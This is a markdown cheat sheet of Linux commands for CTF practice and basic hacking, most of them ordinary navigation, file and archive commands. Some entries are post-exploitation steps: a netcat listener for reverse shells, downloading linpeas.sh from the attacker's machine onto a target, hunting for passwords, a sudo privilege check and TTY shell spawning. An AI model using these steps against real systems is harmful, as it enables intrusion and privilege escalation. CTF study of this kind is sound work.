# ⌨️ Command Cheat Sheet

*Essential commands for CTFs, Linux, and basic hacking. Memorize these to speed up your workflow.*

### 🏆 Daily Practice
*The only way to get fast is repetition. Try to use the terminal for everything you can.*

### 🐧 File System & Navigation
| Command | Description |
| :--- | :--- |
| `ls -la` | List **all** files (including hidden `.files`) with permissions. |
| `pwd` | Print Working Directory (Where am I?). |
| `cd -` | Go back to the *previous* directory you were in. |
| `find . -name "flag.txt"` | Find a specific file in the current folder. |
| `find / -name "flag.txt" 2>/dev/null` | Find a file across the **whole system** (ignoring errors). |
| `grep -r "password" .` | Search for a specific text string inside **all** files in the folder. |
| `locate filename` | Faster search (uses a pre-built database). |
| `which python3` | Shows the path to a binary/program. |

### 📖 Reading & Editing Files
| Command | Description |
| :--- | :--- |
| `cat file.txt` | Dump the whole file to the screen. |
| `less file.txt` | Scroll through a long file (Press `q` to quit). |
| `head -n 20 file.txt` | Show only the first 20 lines. |
| `tail -f access.log` | Watch the end of a file in **real-time** (Great for logs). |
| `strings binary.exe` | Extract readable text from a compiled program (Essential for CTFs!). |
| `xxd file.bin` | View the Hexdump of a file. |

### 🌐 Networking & Recon
| Command | Description |
| :--- | :--- |
| `ip a` | Show your IP address and interfaces. |
| `curl ifconfig.me` | Show your **Public** IP address. |
| `ping -c 4 8.8.8.8` | Test connectivity (stop after 4 pings). |
| `netstat -antp` | Show all active connections and open ports. |
| `ss -tulpn` | Faster version of netstat (Listening ports). |
| `nc -lvnp 4444` | Start a **Netcat Listener** (Wait for a reverse shell). |
| `nc <target_ip> <port>` | Connect to a remote port manually. |

### 📥 File Transfer
*When you have a shell but need to upload a script.*

**1. Python Web Server (Run this on YOUR machine)**
```bash
python3 -m http.server 8000
```

**2. Download command (Run this on the TARGET)**
```bash
wget http://<your_ip>:8000/linpeas.sh
# OR
curl http://<your_ip>:8000/linpeas.sh -o linpeas.sh
```

### ⚡ Permission & Execution
| Command | Description |
| :--- | :--- |
| `chmod +x script.sh` | Make a script **executable** (Run it with `./script.sh`). |
| `chown user:user file` | Change ownership of a file. |
| `sudo -l` | Check what you can run as `root` (Privilege Escalation check). |
| `id` | Show current user ID and group memberships. |
| `w` | See who else is logged into the system. |
| `uname -a` | Show kernel and system information. |

### 🔐 Archives & Compression
| Command | Description |
| :--- | :--- |
| `tar -xvf file.tar` | Extract a `.tar` archive. |
| `tar -xzvf file.tar.gz` | Extract a compressed `.tar.gz`. |
| `unzip file.zip` | Extract a zip file. |
| `gunzip file.gz` | Decompress a `.gz` file. |

### 🥷 CTF "Magic" Tricks
* **Base64 Decode:**
    ```bash
    echo "SGVsbG8=" | base64 -d
    ```
* **MD5 Hash a file:**
    ```bash
    md5sum file.txt
    ```
* **Watch a command (Auto-refresh):**
    ```bash
    watch -n 1 'ls -la'
    ```
* **Re-run last command as sudo:**
    ```bash
    sudo !!
    ```
* **Spawn a TTY Shell (Python):**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```